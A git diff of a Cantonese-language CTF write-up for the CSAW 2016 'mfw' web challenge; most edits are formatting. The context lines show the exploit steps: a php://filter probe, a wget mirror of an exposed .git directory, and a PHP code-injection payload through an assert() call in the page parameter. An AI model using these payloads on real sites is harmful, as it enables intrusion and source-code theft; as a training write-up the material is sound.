@@ -1,8 +1,7 @@
-# CSAW CTF 2016 Quals: mfw
+# CSAW CTF 2016 Quals: mfw (Web, 125)
 
-分類：Web 分數：125
-
-Target: http://web.chal.csaw.io:8000/
+說明：
+> Hey, I made my first website today. It's pretty cool and web7.9. http://web.chal.csaw.io:8000/
 
 ## Exploration
 入到去求其撳個 About 去到呢頁:
@@ -16,7 +15,7 @@ http://web.chal.csaw.io:8000/?page=about
 http://web.chal.csaw.io:8000/?page=php://filter/read=convert.base64-encode/resource=about
 ```
 結果冇料到
-之後求其試下個單引號睇下係唔係D 低能 SQLi 
+之後求其試下個單引號睇下係唔係D 低能 SQLi
 ```
 http://web.chal.csaw.io:8000/?page='
 ```
@@ -30,7 +29,7 @@ http://web.chal.csaw.io:8000/.git/
 有料到喎. 之後可以撳入去 objects 到將D files gzip decompress 返
 唔鍾意人手玩既可以直接一野隊落黎再起返D missing files (即係 source code):
 ```
-wget --mirror -I .git http://web.chal.csaw.io:8000/.git/ 
+wget --mirror -I .git http://web.chal.csaw.io:8000/.git/
 git checkout -- .
 ```
 嗱 template 入面有個 flag.php, 不過一睇就知唔方好野:
@@ -62,14 +61,14 @@ assert("file_exists('$file')") or die("That file doesn't exist!");
 http://web.chal.csaw.io:8000/?page=~(^o^)~
 
 strpos('templates/~(^o^)~.php', '..') === false
-file_exists('templates/~(^o^)~.php') 
+file_exists('templates/~(^o^)~.php')
 ```
 最簡單就用 string concatenation:
 ```
 http://web.chal.csaw.io:8000/?page=d'.strval(print(6*9)).'b
 
 strpos('templates/d'.strval(print(6*9)).'b.php', '..') === false
-file_exists('templates/d'.strval(print(6*9)).'b.php') 
+file_exists('templates/d'.strval(print(6*9)).'b.php')
 ```
 咁樣段code 就冇爛, 重會 print 兩次 54
 之後用個 highlight_file 讀 flag.php 個 source code:
